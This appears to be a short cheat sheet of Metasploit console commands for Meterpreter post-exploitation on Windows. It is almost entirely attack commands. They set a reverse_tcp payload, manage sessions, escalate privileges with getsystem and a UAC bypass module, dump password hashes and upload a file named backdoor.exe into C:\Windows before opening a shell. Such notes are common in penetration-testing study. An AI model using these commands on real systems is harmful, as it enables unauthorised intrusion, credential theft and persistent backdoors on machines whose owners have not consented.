Inside a `msfconsole`:

```bash
> search meterpreter
> set payload windows/meterpreter/reverse_tcp
> exploit
> sessions -l # current opened sessions
> sessions -i 1 # resume session 1
> sysinfo # retrieve info about the exploited machine
> ifconfig # prints the network configuration
> route # routing info
> getuid # which user is running the process exploited
> getsystem # Runs a privilege escalation routine on the target machine

# Bypass UAC (User Account Control policy of modern Windows OSs)
> background # switch from a meterpreter session to the msf console
> search bypassuac
> use exploit/windows/local/bypassuac
> set session 1
> exploit
> getuid

# Dumping the Password Database
> background
> use post/windows/gather/hashdump
> set session 2
> exploit

# Upload / download files
> download HaxLogs.log /root/
> upload /root/backdoor.exe c:\\Windows # note the backslash escaping
> shell

#Locate a file
> search -f test.txt
```
